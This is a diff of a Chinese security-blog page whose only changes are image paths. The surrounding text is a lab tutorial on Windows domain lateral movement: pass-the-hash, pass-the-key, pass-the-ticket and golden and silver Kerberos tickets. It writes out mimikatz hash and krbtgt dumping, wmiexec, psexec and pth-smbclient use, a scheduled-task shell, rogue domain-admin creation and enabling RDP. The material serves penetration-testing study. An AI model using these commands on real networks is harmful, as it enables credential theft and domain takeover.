@@ -465,7 +465,7 @@
 <li>pass the key    （密钥传递攻击，简称ptk）</li>
 </ul>
 <p><strong>环境</strong></p>
-<p><img src="../images/187.png"></p>
+<p><img src="/images/187.png"></p>
 <h3 id="哈希传递攻击-PTH攻击"><a href="#哈希传递攻击-PTH攻击" class="headerlink" title="哈希传递攻击(PTH攻击)"></a>哈希传递攻击(PTH攻击)</h3><p>在域环境下，检测密码不是先将Hash解密再验证是否正确的。在验证输入的账号密码是否正确的时候，是通过验证Hash是否相同来进行校验的。也就是说，或许我们可以通过获取的Hash来伪造管理员账号密码登录，也就是Hash传递，又叫PTH，通过将获取的NTLM密文传递到验证登录的机器，绕过正常验证进行登录系统。</p>
 <h4 id="PTH回顾"><a href="#PTH回顾" class="headerlink" title="PTH回顾"></a><strong>PTH回顾</strong></h4><p>在后渗透中，获取会话之后，首先就是要获取凭证和NTLM hash值。从红队的视角来看，Pth只是横向渗透的开始。获得hash之后，攻击者就可以对它加以利用，比如他们可以尝试破解，但破解hash值还是比较困难的，费时费力，还不一定能搞到正确的密码，于是就诞生了另一种方法。我们来看一下认证过程，认证期间，首先是获取用户输入的密码，然后将其加密得到hash值，然后再把这个加密的hash值用于后期的身份认证。初始认证完成之后，windows就把这个hash值保存到内存中，这样用户在使用过程中就不用重复的输入密码。在凭证转存中，我们可以看到，我们提取了很多的hash值。作为攻击者，我们是不知道密码的，所以在认证的时候，我们直接提供hash值，不用提供密码，windows就会与保存的hash值对比，一致的话，认证就会通过。这就是所谓的pth攻击了。</p>
 <h4 id="可利用的协议"><a href="#可利用的协议" class="headerlink" title="可利用的协议"></a><strong>可利用的协议</strong></h4><p>IPC</p>
@@ -529,13 +529,13 @@ schtasks /run /tn task1 /s 192.168.88.131</code></pre>
 sekurlsa::logonpasswords #hash和明文密码获取
 
 sekurlsa::pth /user:administrator /domain:edu.org /ntlm:414c0887a2140df4d6f2daa20d2adf6f</code></pre>
-<p><img src="../images/180.png"></p>
+<p><img src="/images/180.png"></p>
 <p>执行完之后会弹出一个命令提示符，执行dir \\192.168.88.131\c$成功无需账号密码获取了域控机器的c盘的权限，列出了c盘的文件</p>
 <p>可以把域内IP都遍历一遍，弹出目录的就是存在密码一样。</p>
-<p><img src="../images/181.png"></p>
+<p><img src="/images/181.png"></p>
 <h5 id="①利用Psexec进行交互"><a href="#①利用Psexec进行交互" class="headerlink" title="①利用Psexec进行交互"></a>①利用Psexec进行交互</h5><p>提权获取一个域控机器的cmd命令提示符，移动到psexec所在目录，执行以下命令（因为psexec是微软自带的工具所以在白名单内)，不过很多杀软已经列入黑名单了</p>
 <pre><code>psexec64 \\192.168.88.131 cmd</code></pre>
-<p><img src="../images/186.png"></p>
+<p><img src="/images/186.png"></p>
 <h5 id="②计划任务反弹shell"><a href="#②计划任务反弹shell" class="headerlink" title="②计划任务反弹shell"></a><strong>②计划任务反弹shell</strong></h5><ul>
 <li>(IPC$未登录,但已知明文账号密码情况)</li>
 </ul>
@@ -550,7 +550,7 @@ C:\Windows\system32&gt;schtasks /run /tn task1 /U  edu.org\eas  /P chen@2021 /s 
 
 C:\Windows\system32&gt;schtasks /delete /tn task1 /f /U  edu.org\eas  /P chen@2021 /s 192.168.88.131
 #删除计划任务</code></pre>
-<p><img src="../images/183.png"></p>
+<p><img src="/images/183.png"></p>
 <ul>
 <li>IPC$已登录情况，省略账号密码</li>
 </ul>
@@ -559,13 +559,13 @@ C:\Windows\system32&gt;schtasks /delete /tn task1 /f /U  edu.org\eas  /P chen@20
 
 C:\Windows\system32&gt;schtasks /run /tn task1 /s 192.168.88.131
 成功: 尝试运行 &quot;task1&quot;。</code></pre>
-<p><img src="../images/184.png"></p>
+<p><img src="/images/184.png"></p>
 <p>一分钟后MSF接收到shell</p>
-<p><img src="../images/185.png"></p>
+<p><img src="/images/185.png"></p>
 <h4 id="3-利用SMB进行PTH攻击"><a href="#3-利用SMB进行PTH攻击" class="headerlink" title="3.利用SMB进行PTH攻击"></a>3.利用SMB进行PTH攻击</h4><pre><code>利用条件
 开启445端口
 445端口没被过滤</code></pre>
-<h5 id="①msf-windows-smb-psexec模块"><a href="#①msf-windows-smb-psexec模块" class="headerlink" title="①msf-windows/smb/psexec模块"></a>①msf-windows/smb/psexec模块</h5><p><img src="../images/182.png"></p>
+<h5 id="①msf-windows-smb-psexec模块"><a href="#①msf-windows-smb-psexec模块" class="headerlink" title="①msf-windows/smb/psexec模块"></a>①msf-windows/smb/psexec模块</h5><p><img src="/images/182.png"></p>
 <h5 id="②kali自带工具pth-smbclient"><a href="#②kali自带工具pth-smbclient" class="headerlink" title="②kali自带工具pth-smbclient"></a>②kali自带工具pth-smbclient</h5><pre><code>pth-smbclient -U ignite/Administrator%00000000000000000000000000000000:32196B56FFE6F45E294117B91A83BF38 //192.168.1.105/c$</code></pre>
 <h4 id="4-利用WMI进行PTH攻击"><a href="#4-利用WMI进行PTH攻击" class="headerlink" title="4.利用WMI进行PTH攻击"></a>4.利用WMI进行PTH攻击</h4><p><a target="_blank" rel="noopener" href="https://github.com/maaaaz/impacket-examples-windows/">wmi.exe工具下载</a></p>
 <h5 id="WMIC的利用"><a href="#WMIC的利用" class="headerlink" title="WMIC的利用"></a><strong>WMIC的利用</strong></h5><p>WMI的全名为“Windows Management Instrumentation”。从Windows 98开始，Windows操作系统都支持WMI。WMI是由一系列工具集组成的，可以在本地或者远程管理计算机系统。WMI为用户提供了基本信息，并且让用户有权限执行各种管理任务。这种权限是通过身份认证来实现的。当我们有了凭证的时候，我们就可以执行pth攻击来通过身份认证了。</p>
@@ -575,36 +575,36 @@ WMI 服务开启(默认开启)
 目标主机开放135和445端口。(135 端⼝是 WMIC 默认的管理端⼝，wimcexec 使⽤445端⼝传回显)
 135 端口未被过滤(防火墙拦截)</code></pre>
 <pre><code>wmiexec.exe -hashes 00000000000000000000000000000000:414c0887a2140df4d6f2daa20d2adf6f edu.org/Administrator@192.168.88.135</code></pre>
-<p><img src="../images/188.png"></p>
+<p><img src="/images/188.png"></p>
 <pre><code>wmiexec.exe administrator:chen@2021@192.168.88.135</code></pre>
-<p><img src="../images/190.png"></p>
+<p><img src="/images/190.png"></p>
 <ul>
 <li>利用系统自带的工具 wmic 在目标主机上执行任意命令</li>
 </ul>
 <p>远程创建进程</p>
 <pre><code>wmic /node:192.168.88.135 /user:edu.org\Administrator /password:chen@2021 process call create &quot;cmd.exe /c echo 123 &gt; c:\1.txt&quot;</code></pre>
 <p>缺点:无法回显命令</p>
-<p><img src="../images/189.png"></p>
+<p><img src="/images/189.png"></p>
 <h3 id="密钥传递攻击-PTK攻击"><a href="#密钥传递攻击-PTK攻击" class="headerlink" title="密钥传递攻击(PTK攻击)"></a>密钥传递攻击(PTK攻击)</h3><p>ptk是在域中攻击kerberos认证的一种方式，原理是通过获取用户的aes hmac，通过kerberos认证，可在NTLM认证被禁止的情况下用来实现类似pth的功能。</p>
 <h4 id="利用mimikatz获取aes"><a href="#利用mimikatz获取aes" class="headerlink" title="利用mimikatz获取aes"></a>利用mimikatz获取aes</h4><pre><code>mimikatz # privilege::debug
 
 mimikatz # sekurlsa::ekeys</code></pre>
-<p><img src="../images/191.png"></p>
+<p><img src="/images/191.png"></p>
 <h4 id="利用MSF获取aes"><a href="#利用MSF获取aes" class="headerlink" title="利用MSF获取aes"></a>利用MSF获取aes</h4><p><strong>mimikatz模块的使用需要Administrator权限或者System权限</strong>。MSF中自带mimikatz模块，MSF中的 mimikatz 模块同时支持32位和64位的系统，但是该模块默认是加载32位的系统，所以如果目标主机是64位系统的话，直接默认加载该模块会导致很多功能无法使用。而且在64位系统下必须先查看系统进程列表，然后将meterpreter进程迁移到一个64位程序的进程中，才能加载mimikatz并且查看系统明文。但是在32位系统下则没有这个限制。</p>
 <p>先提权，然后进程迁移到一个x64又是管理员的进程</p>
-<p><img src="../images/192.png"></p>
+<p><img src="/images/192.png"></p>
 <p>加载mimikatz模块，执行mimikatz命令，获取aes_hmac</p>
-<p><img src="../images/193.png"></p>
+<p><img src="/images/193.png"></p>
 <h4 id="利用Cobalt-Strike获取aes"><a href="#利用Cobalt-Strike获取aes" class="headerlink" title="利用Cobalt Strike获取aes"></a>利用Cobalt Strike获取aes</h4><pre><code>beacon&gt; mimikatz &quot;sekurlsa::ekeys&quot;</code></pre>
-<p><img src="../images/194.png"></p>
+<p><img src="/images/194.png"></p>
 <h4 id="攻击样例"><a href="#攻击样例" class="headerlink" title="攻击样例"></a>攻击样例</h4><p>在实际上，PTK传递比PTH传递用的少，因为PTK传递需要一个前提条件，<strong>主机必须打了补丁kb2871997</strong></p>
 <pre><code>sekurlsa::pth /user:administrator /domain:edu.org /aes256:30d6609fbfd3209395999076705feb371739f36da318aa90b33c19b75241b1aa</code></pre>
 <p>在弹出的cmd里利用dir进行域内所有机器的遍历</p>
 <p>dir \\192.168.88.0\c$ …..dir \\192.168.88.255\c$，如果<strong>不是显示账号密码不正确</strong>就说明目标机器的hash和该机器一样。</p>
-<p><img src="../images/181.png"></p>
+<p><img src="/images/181.png"></p>
 <h3 id="票据传递攻击-PTT攻击"><a href="#票据传递攻击-PTT攻击" class="headerlink" title="票据传递攻击(PTT攻击)"></a>票据传递攻击(PTT攻击)</h3><h4 id="Kerberos认证"><a href="#Kerberos认证" class="headerlink" title="Kerberos认证"></a>Kerberos认证</h4><p>弄清Kerberos认证过程，最有利于帮助我们理解域内的金票和银票。Kerberos是一种网络身份验证协议,旨在通过密钥加密技术为客户端/服务器应用程序提供身份验证,主要用在域环境下的身份验证。</p>
 <p>域控的账号密码可以登录域内任意一台主机，那么主机是如何检测域控账号密码是否正确的呢？检验账号密码可以有两种方法，询问域控或者设置一个专门检测账号密码是否正确的第三方中心。在域中便使用到了第三方中心来检验输入的账号密码是否相同。这种第三方中心叫KDC密钥分发中心。</p>
-<p><img src="../images/195.png"></p>
+<p><img src="/images/195.png"></p>
 <h5 id="几个相关的名词"><a href="#几个相关的名词" class="headerlink" title="几个相关的名词"></a>几个相关的名词</h5><h6 id="①KDC"><a href="#①KDC" class="headerlink" title="①KDC"></a><strong>①KDC</strong></h6><p>KDC（Key Distribution Center）密钥分发中心，维护所有账户的名称和Master Key（key的hash code）<br>在KDC中又分为两个部分：Authentication Service(AS,身份验证服务)和Ticket Granting Service(TGS,票据授权服务)</p>
 <h6 id="②AS"><a href="#②AS" class="headerlink" title="②AS"></a><strong>②AS</strong></h6><p>授权服务（Authorization Server），对于上面的流程1，提供初始授权认证，用户表明需求并使用密码对请求进行加密，AS用提供的密码对请求进行解密后得到的请求内容，返回给用户一个TGT（票据授权票据 ticket granting tickets）（用一个密码加密）</p>
 <h6 id="③TGS"><a href="#③TGS" class="headerlink" title="③TGS"></a><strong>③TGS</strong></h6><p>用户得到TGT之后使用TGT去访问TGS（票据授权中心Ticket Granting Server），</p>
@@ -686,10 +686,10 @@ mimikatz # sekurlsa::ekeys</code></pre>
 <h5 id="HASH和SID获取"><a href="#HASH和SID获取" class="headerlink" title="HASH和SID获取"></a>HASH和SID获取</h5><p>上传mimikatz到域控主机,以管理员权限运行CMD</p>
 <p>执行以下命令获取krbtgt用户的hash</p>
 <pre><code>mimikatz.exe &quot;privilege::debug&quot; &quot;lsadump::dcsync /domain:edu.org /all /csv&quot; &quot;exit&quot;&gt;log.txt</code></pre>
-<p><img src="../images/196.png"></p>
+<p><img src="/images/196.png"></p>
 <p>再执行以下命令可以看到krbtgt用户的SID</p>
 <pre><code>lsadump::dcsync /domain:edu.org /user:krbtgt</code></pre>
-<p><img src="../images/197.png"></p>
+<p><img src="/images/197.png"></p>
 <p>注：原Object Security ID最后面有个-502是作为标识的，在制作时需要手动删除</p>
 <h5 id="黄金票据制作"><a href="#黄金票据制作" class="headerlink" title="黄金票据制作"></a>黄金票据制作</h5><pre><code>1、/user: 指定伪造的用户名，一般是Administrator
 2、/sid: 域的sid值
@@ -698,18 +698,18 @@ mimikatz # sekurlsa::ekeys</code></pre>
 <pre><code>kerberos::golden /user:Administrator /sid:域内sid /krbtgt:ntlm-hash /domain:域名 /ticket:ticket.kirbi
 
 kerberos::golden /user:Administrator /sid:S-1-5-21-3658974542-4157274802-4269447764 /krbtgt:129d836ceeac69cbb52340ef1bbdc6d3 /domain:edu.org /ticket:ticket.kirbi</code></pre>
-<p><img src="../images/199.png"></p>
+<p><img src="/images/199.png"></p>
 <p>先通过kerberos::purge清空票据缓存；kerberos::list列出票据显示为空，说明清空了所以票据</p>
 <pre><code>kerberos::purge
 kerberos::list</code></pre>
-<p><img src="../images/200.png"></p>
+<p><img src="/images/200.png"></p>
 <p>把票据载入内存</p>
 <pre><code>kerberos::ptt ticket.kirbi</code></pre>
-<p><img src="../images/198.png"></p>
+<p><img src="/images/198.png"></p>
 <p>注：如果以管理员权限打开的mimikatz，则需要用管理员权限打开CMD,不然会连接不上目标机器</p>
 <p>是否真正写入内存需要打开cmd用以下命令验证，只有缓存是1才是真正写入</p>
 <pre><code>klist</code></pre>
-<p><img src="../images/201.png"></p>
+<p><img src="/images/201.png"></p>
 <p>另外两种执行方法</p>
 <p>①用cmd运行mimikatz</p>
 <pre><code>mimikatz.exe &quot;privilege::debug&quot; &quot;kerberos::golden /user:Administrator /sid:S-1-5-21-3658974542-4157274802-4269447764 /krbtgt:129d836ceeac69cbb52340ef1bbdc6d3 /domain:edu.org /ptt&quot; &quot;exit&quot;</code></pre>
@@ -718,14 +718,14 @@ kerberos::list</code></pre>
 <h5 id="利用"><a href="#利用" class="headerlink" title="利用"></a><strong>利用</strong></h5><h6 id="①创建超管用户，然后利用超管用户登录域内其他主机接管。"><a href="#①创建超管用户，然后利用超管用户登录域内其他主机接管。" class="headerlink" title="①创建超管用户，然后利用超管用户登录域内其他主机接管。"></a>①创建超管用户，然后利用超管用户登录域内其他主机接管。</h6><pre><code>net user chen qaz@123! /add /domain
 net group &quot;domain admins&quot; chen /add /domain</code></pre>
 <p>执行dir的时候连接DC,测试金票伪造是否成功只能使用<strong>主机名拼接域名</strong>，用IP去测试会失败。</p>
-<p><img src="../images/202.png"></p>
+<p><img src="/images/202.png"></p>
 <p><strong>执行命令打开域内其他目标机器3389端口</strong></p>
 <pre><code>wmic /node:192.168.88.135 /user:edu.org\chen /password:qaz@123! process call create &#39;cmd.exe /c REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f&#39;</code></pre>
-<p><img src="../images/204.png"></p>
+<p><img src="/images/204.png"></p>
 <p>然后利用chen这个刚创建的超管用户进行远程登录机器接管</p>
-<h6 id="②利用PsExec提权进行交互"><a href="#②利用PsExec提权进行交互" class="headerlink" title="②利用PsExec提权进行交互"></a><strong>②利用PsExec提权进行交互</strong></h6><p><img src="../images/203.png"></p>
+<h6 id="②利用PsExec提权进行交互"><a href="#②利用PsExec提权进行交互" class="headerlink" title="②利用PsExec提权进行交互"></a><strong>②利用PsExec提权进行交互</strong></h6><p><img src="/images/203.png"></p>
 <p><strong>用金票进行访问域内的其他主机复现失败(不知道为啥)</strong></p>
-<p><img src="../images/205.png"></p>
+<p><img src="/images/205.png"></p>
 <h4 id="白银票据伪造-Silver-Ticket"><a href="#白银票据伪造-Silver-Ticket" class="headerlink" title="白银票据伪造(Silver Ticket)"></a>白银票据伪造(Silver Ticket)</h4><h5 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h5><p>如果说黄金票据是伪造的TGT,那么白银票据就是伪造的ST。<br>在Kerberos认证的第三部，Client带着ST和Authenticator3向Server上的某个服务进行请求，Server接收到Client的请求之后,通过自己的Master Key 解密ST,从而获得 Session Key。通过 Session Key 解密 Authenticator3,进而验证对方的身份,验证成功就让 Client 访问server上的指定服务了。<br>所以我们只需要知道Server用户的Hash就可以伪造出一个ST,且不会经过KDC,但是伪造的门票只对部分服务起作用。</p>
 <h5 id="伪造银票的所需条件"><a href="#伪造银票的所需条件" class="headerlink" title="伪造银票的所需条件"></a><strong>伪造银票的所需条件</strong></h5><pre><code>1、/domain: 指定域名
 2、/sid: 客户端用户的sid号
@@ -734,17 +734,17 @@ net group &quot;domain admins&quot; chen /add /domain</code></pre>
 5、/service：需要伪造的服务，例如cifs访问文件服务
 6、/user: 指定需要伪造的用户，一般使用Administrator</code></pre>
 <p>服务类型可以从以下内容中来进行选择，因为我们没有TGT去不断申请ticket，所以只能针对某一些服务来进行伪造</p>
-<p><img src="../images/206.png"></p>
+<p><img src="/images/206.png"></p>
 <h5 id="所需要的信息获取"><a href="#所需要的信息获取" class="headerlink" title="所需要的信息获取"></a>所需要的信息获取</h5><p><strong>客户端用户的sid号</strong></p>
 <p><code>sid</code>值：这里需要指定域内的<code>sid</code>值，我们可以通过<code>whoami /all</code>来进行查询</p>
 <pre><code>whoami /all</code></pre>
-<p><img src="../images/207.png"></p>
+<p><img src="/images/207.png"></p>
 <p><strong>目标机器的<code>NTLM Hash</code>值</strong></p>
 <p>目标机器的NTLM Hash值，而不是域内账号的NTLM Hash值。拿着域管的NTLM Hash去生成白银票据，发现是不能进行横向移动的。这里需要指定机器的NTLM Hash值，也就是说需要指定机器本地账户的NTLM Hash值。通常情况下，例如目标机器名为m1sn0w，那么这里需要指定的NTLM Hash值应该为m1sn0w$账号对应的NTLM Hash值。(如果hostname查出的机器名字是大写EAS3,则对应的hash的username也必须是大写EAS3，而不是小写eas3)</p>
-<p><img src="../images/208.png"></p>
+<p><img src="/images/208.png"></p>
 <h5 id="白银票据制作"><a href="#白银票据制作" class="headerlink" title="白银票据制作"></a>白银票据制作</h5><pre><code>kerberos::golden /domain:edu.org /sid:S-1-5-21-3485537082-426029256-2976247771 /target:EAS3.edu.org /rc4:fd6054cb66b99ee07c3ef0c0ae85b4f2 /service:cifs /user:Administrator /ptt</code></pre>
-<p><img src="../images/209.png"></p>
-<h5 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h5><h6 id="利用PsExec提权进行交互"><a href="#利用PsExec提权进行交互" class="headerlink" title="利用PsExec提权进行交互"></a>利用PsExec提权进行交互</h6><p><img src="../images/210.png"></p>
+<p><img src="/images/209.png"></p>
+<h5 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h5><h6 id="利用PsExec提权进行交互"><a href="#利用PsExec提权进行交互" class="headerlink" title="利用PsExec提权进行交互"></a>利用PsExec提权进行交互</h6><p><img src="/images/210.png"></p>
 <h4 id="金票和银票的区别"><a href="#金票和银票的区别" class="headerlink" title="金票和银票的区别"></a>金票和银票的区别</h4><h5 id="获取的权限不同"><a href="#获取的权限不同" class="headerlink" title="获取的权限不同"></a>获取的权限不同</h5><p>金票：伪造的TGT，可以获取任意Kerberos的访问权限<br>银票：伪造的ST，只能访问指定的服务，如CIFS</p>
 <h5 id="认证流程不同"><a href="#认证流程不同" class="headerlink" title="认证流程不同"></a>认证流程不同</h5><p>金票：同KDC交互，但不同AS交互<br>银票：不同KDC交互，直接访问Server</p>
 <h5 id="加密方式不同"><a href="#加密方式不同" class="headerlink" title="加密方式不同"></a>加密方式不同</h5><p>金票：由krbtgt NTLM Hash 加密<br>银票：由服务账号 NTLM Hash 加密</p>
